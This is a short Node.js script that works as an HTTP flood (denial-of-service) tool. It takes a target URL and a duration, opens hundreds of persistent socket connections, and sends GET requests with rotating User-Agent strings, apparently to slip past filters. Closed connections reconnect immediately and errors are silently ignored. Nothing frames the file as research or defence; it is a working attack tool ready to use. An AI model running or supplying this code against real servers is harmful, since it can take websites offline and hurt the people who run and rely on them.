const net = require('net');
const fs = require('fs');
const url = require('url');

if (process.argv.length <= 2) {
    console.log("Usage: node http.js <url> <time>");
    process.exit(-1);
}

const target = process.argv[2];
const parsed = url.parse(target);
const host = parsed.hostname;
const port = parsed.port || 80;
const path = parsed.path || '/';
const time = process.argv[3] * 1000;

// Load User-Agents from ua.txt
let userAgents = [];
try {
    const data = fs.readFileSync('ua.txt', 'utf8');
    userAgents = data.split('\n').filter(ua => ua.trim() !== '');
} catch (err) {
    console.log('Error reading ua.txt, using default User-Agents');
    // Fallback ke default User-Agents jika file tidak ada
    userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
    ];
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

function flood() {
    const socket = new net.Socket();
    
    socket.connect(port, host, () => {
        const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
        const request = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${ua}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n`;
        socket.write(request);
    });

    socket.on('data', () => {
        socket.destroy();
    });

    socket.on('error', () => {
        socket.destroy();
    });

    socket.on('close', () => {
        // Immediately create new connection
        flood();
    });
}

// Start flooding
console.log(`Starting HTTP RAW flood to ${host} for ${time/1000} seconds`);
for(let i = 0; i < 500; i++) { // Increased concurrent connections
    setTimeout(() => flood(), i * 10);
}

// Stop after specified time
setTimeout(() => {
    console.log('Attack finished');
    process.exit(0);
}, time);